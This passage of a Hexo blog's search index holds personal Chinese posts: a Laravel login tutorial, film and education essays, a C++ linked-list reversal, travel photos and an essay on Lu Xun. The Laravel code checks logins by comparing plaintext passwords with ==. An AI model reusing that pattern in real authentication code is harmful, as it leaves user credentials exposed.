class="string">"required|string|max:20"</span></span><br><span class="line">            ]</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>($validate)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;judge($request-&gt;input(<span class="string">"account"</span>),$request-&gt;input(<span class="string">"password"</span>)))</span><br><span class="line">            &#123;<span class="keyword">return</span> <span class="keyword">true</span>;&#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"账号不存在或密码不正确"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">judge</span><span class="params">($account,$password)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="keyword">return</span> Student::where(<span class="string">"account"</span>,$account)-&gt;value(<span class="string">'password'</span>)==$password;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样我们就可以了解到从登录界面post的数据，被控制器中的save的$request变量捕获了，并且将其进行了表单验证，我们需要进行两次验证，第一次验证用户输入是否合法，如果不合法，该方法将会重定向到登录页面要求你重新输入，否则的话，进行第二次验证，从Model里（我们在Model封装了数据库，这里不再展示）取出数据进行比对，如果账号密码都符合条件，就成功验证，否则会告诉你账号或密码输入不正确。</p>
<p>现在，我们就完成了最简单的MVC与User之间的交互模式。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Laravel</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>我不适合写作文</title>
    <url>/2020/03/05/1/</url>
    <content><![CDATA[<p>  从小学到高中，我的作文成绩从来没有高过，因为当我拿到特定的作文题目时，并且被要求在特定规限的时间写完，我总是感到头脑一片空白和不知所措，只能依靠一些特定的写法和烂俗的套路完成；或许有时候我遇到一些灵光乍现的想法，但这些想法也通常不被认可。</p>
<a id="more"></a>

<p>  但是，当我看完其他人的”优秀作文“以后，我却觉得他们写的一点也不比我好，同样是特定的写法和烂俗的套路，唯一比我具有优势的是他们的字写的比我好。而且我发现，他们仿佛除了作文以外，是不大会写其他东西的，这使我想到，“写作文”和“写文章”根本不是一码事，作文写得好无非是套路掌握得好或者更加迎合试卷命题与阅卷老师的心理罢了。而文章，则是天马行空，无所不至，你想写就写，不想写就不写，不必受到题目的限制，只需要有感情的召唤就足够了。</p>
<p>  我觉得写文章是自己的事，是不能被其他人的其他标准所评判的。</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>See You Never</title>
    <url>/2020/03/04/1/</url>
    <content><![CDATA[<p>  刚刚看完了《后会无期》，觉得还是一个不错的片子，虽然被很多人诟病为没有主线剧情，结构松散。但是，我想表达的是，不是所有的影片都需要完整的主线剧情，只要影片所表达的东西，可以告诉观众一些东西，或者震撼观众的心灵，就是好的影片。</p>
<p>  这部影片虽然没有主要的剧情，但一对对的分支的剧情，也确实围绕着“后会无期”的主题展开，从头到尾主人公一行遇到的人或事，在最终都是“后会无期”，注意，这里的后会无期并非是以后再也不会见到了，而是“有可能遇到，也有可能遇不到了”，也就是处于一种“未卜”的状态，其中使我震撼的一段是马浩汉将被雨淋湿的钱和江河把苏米的“包小姐”联系牌放在车窗上晒，然后等一觉醒来以后，却发现连车窗都没了，这段确实十分的荒诞，但倘若联系到实际的话，不得不承认它具备一定的合理性，连死物件都可能后会无期，何况人呢？</p>
<a id="more"></a>

<p><img src="/2020/03/04/1/1.jpg" alt></p>
<p>  从马浩汉用火烧了房子却忘了把煤气罐搬出房子开始，就注定这是一场有去无回的旅行，虽然马浩汉开始的表现十分的一往无前和具有极大的勇气，但随着时间的消磨，而实际上最具有勇气的是江河这个未经社会打磨，具备理想主义和有些神经质的地理教师。虽然马浩汉鼓吹自己“行路多，社会阅历广，朋友多”，但不得不承认像江河这种习惯孤独的人才不容易被恶劣的环境打败。</p>
<p>  最后说一说关于苏米同江河之间有些“朦胧”的感情，虽然苏米直言“自己很厌恶男人”，并且在首先同江河交流的时候，时不时露出揶揄的表情，但是苏米在听到江河“无脑”的同声传译却在不经意间攻破了苏米的防线。儿时对未来的幻想，有哪个是没有的呢？又有多少人，能够在自己长大的时候，回望当初的期许，而不生出一点遗憾的呢？“我会变漂亮吗？”好像是。“我会变富有吗？”好像不是。“世事难料”的确如此。“顺其自然。”我还可以做到吗？于是苏米望过来的眼神就开始变化了。注意到苏米两次让江河“说点什么以缓解尴尬”，第一次说的时候，她面无表情；但是在第二次说的时候，她面带微笑，无比轻松惬意。</p>
<p>  最后来到了三叔一行赶到了主角一行所在的加油站，当苏米看到三叔一行来到的时候，她感到“惊讶与错愕”，连刚买的东西都掉落了。当她同她失语的哥哥用手语交流，并“直言不讳”地说出“我好像喜欢上他了”，她本期盼得到哥哥诸如鼓励的话，但得到的确是“你忘了那个王八蛋了吗？”。</p>
<p>江河一只看起来呆头呆脑，在感情中处于被动状态，但从他那孱弱的身躯但却一脚踹开旅馆那个岌岌可危的大门的时候，就已经证明这个男人实在蕴含着无尽的能量，他对于苏米表达喜欢的方式就是不断劝她从良，具体来说，我感觉这就像是现实生活中我们某些直男的做法（逃。</p>
<p>  而实际上，苏米也并无像她表现的那样对于社会的美好一切看破，也就如同马浩汉看起来那么乐观一样，而真正所谓“看破尘世美好的”，大概是像她三叔那样，虽然嘴里说着“只有家人替你好”，可实际上却又逼着你犯罪。最终，苏米被带走，后会无期。</p>
<p>  最终结尾是苏米靠在了江河的肩上，虽然我不知道这是不是幻想，但我相信它是现实。</p>
<p>  最后的最后，我希望同有的人永远后会无期，有的人……我期盼再次相遇。</p>
<hr>
<p>最近看了几篇影评，想再来补充几句，有的人说其实马浩汉从刘莺莺那里出发之后就遭遇车祸死去了，后来的全是江河在自己的小说《旅行者》的臆想，从那个神秘人物阿吕开始就是江河小说中的想象了，直至最会江河和浩汉的分别更是暗示了浩汉的死亡。而且电影开始也以胡生的口吻暗示了这是江河的小说《旅行者》的故事。而后江河与浩汉的故事则是江河本人的分裂了，至于最后看起来美好的结局也有着诡异之处，比如在东极岛上暴雨下柴伯公巨像的火炬仍然燃烧，还有幽灵导游的声音。这是浪漫主义的处理手法，我相信是如此的。现实太残酷了，总是要有浪漫的。</p>
<p><img src="/2020/03/04/1/2.jpg" alt></p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>movie</tag>
        <tag>philosophy</tag>
      </tags>
  </entry>
  <entry>
    <title>Reserve Linked List</title>
    <url>/2020/03/02/1/</url>
    <content><![CDATA[<p>Last week I learned data structure about Linked List , in which include an algorithm for reversing a linked list . And in this chapter I will introduce this algorithm.</p>
<a id="more"></a>

<p>First considering a simple example . You is given a linked list of integers , and the question asks you to invert this linked list.</p>
<p>For example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line"></span><br><span class="line">5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure>

<p>For iterating through this linked list and inverting it , you can declare three pointers (prev , curr, next), which represent the previous , current , next pointers. And in this way can you search this linked list and invert it iteratively.</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">​    ListNode* prev=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">​    ListNode* curr=head;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">while</span>(curr!=<span class="literal">NULL</span>)</span><br><span class="line"></span><br><span class="line">​    &#123;</span><br><span class="line"></span><br><span class="line">​      ListNode* next=curr-&gt;next;</span><br><span class="line"></span><br><span class="line">​      curr-&gt;next=prev;</span><br><span class="line"></span><br><span class="line">​      prev=curr;</span><br><span class="line"></span><br><span class="line">​      curr=next;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> prev;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>关于意大利</title>
    <url>/2020/02/29/1/</url>
    <content><![CDATA[<h3 id="蛋堡"><a href="#蛋堡" class="headerlink" title="蛋堡"></a>蛋堡</h3><p><img src="/2020/02/29/1/Italy1.jpg" alt="蛋堡" title="蛋堡"></p>
<h3 id="那不勒斯"><a href="#那不勒斯" class="headerlink" title="那不勒斯"></a>那不勒斯</h3><p><img src="/2020/02/29/1/Italy2.jpg" alt="那不勒斯" title="那不勒斯"></p>
<h3 id="卡布里岛"><a href="#卡布里岛" class="headerlink" title="卡布里岛"></a>卡布里岛</h3><p><img src="/2020/02/29/1/Italy3.jpg" alt="卡布里岛" title="卡布里岛"><a id="more"></a></p>
<h3 id="卡布里岛上的购物街"><a href="#卡布里岛上的购物街" class="headerlink" title="卡布里岛上的购物街"></a>卡布里岛上的购物街</h3><p><img src="/2020/02/29/1/Italy4.jpg" alt="卡布里岛上的购物街" title="卡布里岛上的购物街"></p>
<h3 id="傍晚的苏莲托"><a href="#傍晚的苏莲托" class="headerlink" title="傍晚的苏莲托"></a>傍晚的苏莲托</h3><p><img src="/2020/02/29/1/Italy5.jpg" alt="傍晚的苏莲托" title="傍晚的苏莲托"></p>
<h3 id="酒店在举办音乐会"><a href="#酒店在举办音乐会" class="headerlink" title="酒店在举办音乐会"></a>酒店在举办音乐会</h3><h3 id><a href="#" class="headerlink" title></a><img src="/2020/02/29/1/Italy6.jpg" alt="酒店在举办音乐会" title="酒店在举办音乐会"></h3><h3 id="凯旋门"><a href="#凯旋门" class="headerlink" title="凯旋门"></a>凯旋门</h3><p><img src="/2020/02/29/1/Italy7.jpg" alt="凯旋门" title="凯旋门"></p>
<h3 id="罗马斗兽场外部"><a href="#罗马斗兽场外部" class="headerlink" title="罗马斗兽场外部"></a>罗马斗兽场外部</h3><p><img src="/2020/02/29/1/Italy8.jpg" alt="罗马斗兽场外部" title="罗马斗兽场外部"></p>
<h3 id="罗马斗兽场内部"><a href="#罗马斗兽场内部" class="headerlink" title="罗马斗兽场内部"></a>罗马斗兽场内部</h3><p><img src="/2020/02/29/1/Italy9.jpg" alt="罗马斗兽场内部" title="罗马斗兽场内部"></p>
<h3 id="凯旋门正面"><a href="#凯旋门正面" class="headerlink" title="凯旋门正面"></a>凯旋门正面</h3><p><img src="/2020/02/29/1/Italy10.jpg" alt="凯旋门" title="凯旋门"></p>
<h3 id="西班牙广场"><a href="#西班牙广场" class="headerlink" title="西班牙广场"></a>西班牙广场</h3><p><img src="/2020/02/29/1/Italy11.jpg" alt="西班牙广场" title="西班牙广场"></p>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><p><img src="/2020/02/29/1/Italy12.jpg" alt="西班牙广场" title="西班牙广场"></p>
<p><img src="/2020/02/29/1/Italy13.jpg" alt="西班牙广场" title="西班牙广场"></p>
<h3 id="梵蒂冈"><a href="#梵蒂冈" class="headerlink" title="梵蒂冈"></a>梵蒂冈</h3><p><img src="/2020/02/29/1/Italy14.jpg" alt="梵蒂冈" title="梵蒂冈"></p>
<h3 id="瑞士雇佣兵"><a href="#瑞士雇佣兵" class="headerlink" title="瑞士雇佣兵"></a>瑞士雇佣兵</h3><p><img src="/2020/02/29/1/Italy15.jpg" alt="瑞士雇佣兵" title="瑞士雇佣兵"></p>
<p><img src="/2020/02/29/1/Italy16.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy17.jpg" alt></p>
<h3 id="巨大的花园"><a href="#巨大的花园" class="headerlink" title="巨大的花园"></a>巨大的花园</h3><p><img src="/2020/02/29/1/Italy18.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy19.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy20.jpg" alt></p>
<h3 id="佛罗伦萨"><a href="#佛罗伦萨" class="headerlink" title="佛罗伦萨"></a>佛罗伦萨</h3><p><img src="/2020/02/29/1/Italy21.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy22.jpg" alt></p>
<h3 id="威尼斯"><a href="#威尼斯" class="headerlink" title="威尼斯"></a>威尼斯</h3><p><img src="/2020/02/29/1/Italy23.jpg" alt="威尼斯" title="威尼斯"></p>
<p><img src="/2020/02/29/1/Italy24.jpg" alt="威尼斯" title="威尼斯"></p>
<p><img src="/2020/02/29/1/Italy25.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy26.jpg" alt></p>
<p><img src="/2020/02/29/1/Italy27.jpg" alt></p>
<h3 id="传说中罗密欧与朱丽叶相遇的地方"><a href="#传说中罗密欧与朱丽叶相遇的地方" class="headerlink" title="传说中罗密欧与朱丽叶相遇的地方"></a>传说中罗密欧与朱丽叶相遇的地方</h3><p><img src="/2020/02/29/1/Italy28.jpg" alt="传说中罗密欧与朱丽叶相遇的地方" title="传说中罗密欧与朱丽叶相遇的地方"></p>
]]></content>
      <categories>
        <category>旅行</category>
      </categories>
      <tags>
        <tag>旅行</tag>
      </tags>
  </entry>
  <entry>
    <title>庄颜、神仙姐姐与爱情幻想</title>
    <url>/2020/02/28/1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="2604ec89e52be6674c536131ab743352118fb0097f458e1f3d6042c32f628460">974a10538692d123775750fa4cd57060c51ca00670dff0798dcebf9171161591d27e6e9ffde021ff9e7f762d001aa4c27698281cb13fe572aa3aba24792fe2e1ac28f6bc84f9e6a559096062249f63067bf1a08f600e6bbf366793e263514fb653c919a4852a3b6ad88924bec16a1a3c8890d700437a414c80e9ead39d13934708be39fc605e6b8999688cecdc7b5e20b9ba2cf524e7851e382991355692dca0f13cc4d3402f44e3e09a9a3725ea499a614ff270d970f6662eb2e69f1ca53a06b73786a7517e74b5e926fd2f3403eb030aee5edfc98c534a7657f5decca6e51700199af01e234eb44e7dbeec4e030708e734d65fb4d9e6f5b07c79dc965b5a9f4d6e33fd4e7cdf6721c2a4b919fae95757e60b58f59ed51adbdd215d8358b673</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>爱情</tag>
        <tag>杂论</tag>
      </tags>
  </entry>
  <entry>
    <title>家居学习语</title>
    <url>/2020/02/27/moan/</url>
    <content><![CDATA[<p>因为疫情的原因，我们国家的各个中学校、高等学府都开始了线上授课，即以直播或者以网课为途径进行授课。在我没开学的时候，我天真地以为，这次疫情的发展，也许会促进 教育在网络上的发展，使得我们今后的课程可以通过网络进行，由此可以扩展教育的普及度以及减少学生的教育负担。尤其是对于我这种只喜欢舒舒服服待在家里，受不了宿舍嘈杂环境的人， 简直是福音。可是当我灰溜溜地上完一周的线上课后，我才真心感觉到我那时的想法还是多么的天真。我们国家的网络教育事业，仍然是处于非常低水平，教育内容也是非常刻板与愚蠢的。</p>
<a id="more"></a>

<p>首先说我们的网课，我自己认为网课的内容简直是惨不忍睹，一套课程下来，只有一个老师在那里逐字地去念ppt，声调完全没有变化，就好像刻板的机器一样，知道的以为他在讲课，不知道的还以为 他在基督教堂里做弥撒。从他呆板的语调中我听不出这节课的任何重点。于是，在忍受了几天的课程终于受不了，就去自己看书自学，或者去其他的网站自己找课程学习。我当然并不反对每个学校录课， 为教育公开贡献一份自己的力量，不过有一句话叫做“陈力就列，不能则止”。</p>
<p>事实上，我认为一所名校，是完全有可能做好线上教育的行当的，不过我们的国情是学校都不大把教学放在心上，但偏偏又爱事事争先，看到哪个学校又推出了什么项目，我们便也想去模仿一下。 或者某个名校又有某个天才学生的加盟啦，美女教师评职称啦，学校就又会大力宣传一番，吸引看客的眼球，让一群不懂装懂的人评头论足。这些事情的发生，并非是我信口胡诌，你多少都能发现些 蛛丝马迹。</p>
<p>我是学计算机专业的，当我在网络上挑选书籍的时候，我总会挑选国外的计算机专业书籍。国内没有计算机专业书籍吗？不是！国内的计算机书籍稂莠不齐，虽然也有一些精品书籍，但大都是少数， 很多都是名词的罗列与概念的堆砌，更像是大学生毕业时写论文东抄抄西抄抄的感觉。我们的专业教材为什么如此不堪呢？是真的没有人可以写吗？并不是！我们有水平且有资格写教材的人大都是各个“名校” 的教授专家们，教育部把编写某个教材的人物分配给某个高校，学校又分配给学校内该领域的教授，但是教授呢，他可没那么多功夫写，他还要做科研呢！于是就把任务分配给自己课题下的研究生、博士生们， 研究生、博士生怎么办呢，人家还要毕业呢？可是水平不够怎么办呢？那就抄吧！那好抄抄哪，但为了避免查重，一个专题还得换着书抄，如此作为，书的质量能好得了吗？</p>
<p>我认为之所以我们国家出不了经典的教材，出不了适合国人的教育课程，根本原因就是教育体系的评判方式有问题，中国的教师只能靠科研或者搞学术获得晋升，而不能通过教课来评职称。 为什么我们中小学教育在全世界属于领先水平，但是高等教育却被诟病呢？其实质就是中小学教育教师是全职教课的，而在高等学府教师的晋升之道就只有搞学术一条，这样教师又怎能有大把精力来考虑 教学问题呢？</p>
<p>还记得14年的时候四川大学历史讲师周鼎发的那篇<a href="solo.html">《自白书》</a>吗？若非如此，教授们又怎会将自己“著作等身”的东西弃如敝履呢？</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>理想的知识阶级</title>
    <url>/2020/02/27/ideal-political/</url>
    <content><![CDATA[<p>我一直认为自己是一个理想主义者，我喜欢读历史，读文学，喜欢听音乐，我喜欢同别人交谈却很少可以找到知心的人，我把这件事归于我的理想化， 我对于我的理想充满了向往，却又不断地做出妥协，虽然如今我认为“妥协”是人在社会上生存的本能,却又不甘心去做一个永远“妥协”的人。</p>
<a id="more"></a>

<p>我在这个寒假看了很多电影，尤其是韩国电影，像李沧东的《燃烧》、《薄荷糖》，奉俊昊的《杀人回忆》、《寄生虫》,还有像《辩护人》等， 这些电影无论是从艺术处理还是从深度上自然都是极好的，尤其是对于韩国民主化进程的反思以及对于那代人所带来的灾难性发展。可我认为， 仅仅有道德上的批判是不够的，缓慢地变革是不彻底的，光荣革命、辛亥革命都是阉割了的革命。</p>
<p>前今天和朋友聊人生的时候，我就说：“等我以后赚够了钱，就隐居山林，开个咖啡馆或者书店，做自己喜欢做的事情，如果还有余力的话，就去 旅游，见识世界的山水人情。”然后，我又自嘲地说，我是不是太过理想了，在一个社会中，什么人可以自由自在地过完自己的一生呢？每个人都要受社会、 家庭、欲望等等因素的羁绊，自古皆然。也许当我有幸可以达到我现在所需要的条件的时候，我就又往更远的地方看了呢。</p>
<p>近些日子来，中国爆发了数十年来从未见过的“瘟疫”，我看到了许许多多丑恶与善良的事情，也听到了消极或积极的声音。我不对于这些事情予以置评， 因为我从未亲身经历过这些事情，而没有经历过同样事情的人是没有资格对一件事情发出评论的；我也不是批评家，我没有那么好的文笔和蛊惑性，我只是想把 我看到的，思考过的，读过的，说过的记录下来，呈现给大家，或许你会认为这篇文章杂乱无章，一点没有可读性。我认为这本身是对的，因为事情就是这么乱， 我只是把我想到的全部写出来。当我看历史的时候，我会感到痛心，因为我看到了在历史舞台上叱咤风云的人物竟然也会如此平庸，我们也一样，如此平庸。</p>
<p>前些日子读到鲁迅先生的一篇杂文<a href="https://www.marxists.org/chinese/reference-books/luxun/24/045.htm" target="_blank" rel="noopener">《关于知识阶级》</a> ，说实话，我真的觉得这是我本年度读的，甚至可以说是有生以来读的最优秀的杂文，在这里他提出了一个“真的知识阶级”，并且做了两点界定，“他与平民接近，或 自身就是平民”，“因此他确能为平民抱不平，把平民的苦痛告诉大众”；“他们对社会永不会满意的，所感受的永远是痛苦，所看到的永远是缺点”，它所强调的是，真正 的知识阶级，是要永远站到平民阶级这边的，所谓平民阶级，不是某一个人，也不是某一个团体，因为某一个人或者某一个团体，都有可能在历史的进程中实现阶级的转换， 而真正的知识阶级，则是要坚持拥护在易受到倾轧的团体的这边，否则，就会变成“革命奸商”，“革命小贩”，“革命工头”与“奴隶总管”。鲁迅对被压迫的民众的反抗的合理性， 是从不怀疑的，他有句名言，“人被压迫了，为什么不斗争？”，正是怀着这种对于底层阶级深刻的同情，他后来对当时中国唯一反抗国民党一党专政的共产党领导的工农革命运动， 采取同情与支持的态度，并且与共产党人合作，共同发起左翼文艺运动，都是一种自觉的选择。当他目睹年轻的革命文学者为了自己的争取民众解放的信仰不惜流血牺牲，更是用 少有的热情由衷地赞叹“无产阶级革命文学和革命的劳苦大众是在受一样的压迫，一样的残杀，做一样的战斗，有一样的运命”，这与前述站在普通民众这一边，做永远的革命者的“ 真的知识阶级”的定位，是完全一致的。或者可以说，一个真的知识阶级几乎是必然要做这样的选择的。</p>
<p>然而值得一提的是关于“党的左翼”与“鲁迅左翼”，到了三十年代中后期，面对日本侵略，中国共产党改变策略，主张建立民族统一战线，在文学上，提出“国防文学”的口号。 鲁迅对“国防文学”口号并不反对，但是有点担心，如果过分地强调国家利益至上，会不会掩盖或者美化国民党一党专政的统治？会不会因此损害工农民众的基本利益？他有这样的担心，就提出 另外一个口号“民族革命时代的大众文学”，强调战争的革命性，要维护大众的利益，就要坚持他的左翼立场。</p>
<p>另一件事是许广平在1927年国共合作时，曾经有过加入国民党的想法，她征求鲁迅的意见，鲁迅就对她说，一个政党是要靠组织力量来实现它的理想、信念的，所以政党是要强调纪律性的， 要求党员绝对服从政党的决议，有的时候就要牺牲个人意志。因此要求你入党，就必须想清楚，你是否愿意在一定条件下牺牲个人意志，如果愿意就加入，如果不愿意，要保持个人意志和独立性， 就别加入。这是鲁迅的个体精神，这也是鲁迅左翼与党的左翼的根本性分歧。</p>
<p>所以我们现在回头来看看，什么是真正的理想主义？像我从前所想那样，只顾着自己的自由与快活，大概是算不上真正的理想主义的，因为如此的“理想”，是无法去实现的。真正的理想主义， 更是应当去立足于实际，对于一切具有批判性思维与探索欲，这是“理想的知识阶级”。再理想的东西，也应当有其实际意义与实际用处，而非一味的空穴来风。</p>
<p>我读《北洋军阀史》的时候，就发现孙文这个真正的理想主义者，却被整个大环境给搞偏了，以至于在袁世凯在北京就任大总统后，孙文因为太过理想而被孤立，整个同盟会也土崩瓦解，形成了 国民党、民主党、共和党等等，尤其自从唐绍仪内阁瓦解后，原来的政党内阁成为了内阁政党，从而变成了袁世凯攫取权力的工具。这是因为辛亥革命从一开始便是不彻底的，当革命军达到一定规模时， 同盟会成员想的不是如何从内部推举首领，反而邀请封建名流及政治家如黎元洪等担任首领，这便是没有真正地深入到国民中去。</p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂论</tag>
      </tags>
  </entry>
</search>
